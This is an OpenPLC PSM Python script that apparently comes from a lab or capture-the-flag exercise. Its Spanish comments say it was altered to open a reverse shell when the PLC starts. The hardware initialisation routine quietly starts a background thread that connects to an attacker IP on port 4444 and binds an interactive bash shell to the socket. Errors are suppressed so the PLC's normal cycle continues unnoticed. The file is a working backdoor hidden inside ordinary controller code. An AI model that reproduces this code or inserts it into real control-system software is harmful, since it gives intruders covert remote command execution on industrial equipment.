#!/usr/bin/env python3

#   Modificado por NiPeGun para lanzar una reverse shell al iniciar el PLC

import psm
import time
import socket
import subprocess
import os
import threading

#global variables
counter = 0
var_state = False

# Reverse Shell Configuration
ATTACKER_IP = "10.8.73.141"  # <-- Sustituye por tu IP
ATTACKER_PORT = 4444         # <-- Sustituye por tu puerto

def reverse_shell():
  try:
    s = socket.socket()
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
  except:
    pass  # Evita que el fallo del shell interrumpa el ciclo del PLC

def hardware_init():
  #Insert your hardware initialization code in here
  psm.start()
  
  # Lanzar reverse shell en segundo plano
  t = threading.Thread(target=reverse_shell)
  t.daemon = True
  t.start()

def update_inputs():
  global counter
  global var_state
  psm.set_var("IX0.0", var_state)
  counter += 1
  if (counter == 10):
    counter = 0
    var_state = not var_state

def update_outputs():
  a = psm.get_var("QX0.0")
  if a == True:
    print("QX0.0 is true")

if __name__ == "__main__":
  hardware_init()
  while (not psm.should_quit()):
    update_inputs()
    update_outputs()
    time.sleep(0.1)
  psm.stop()
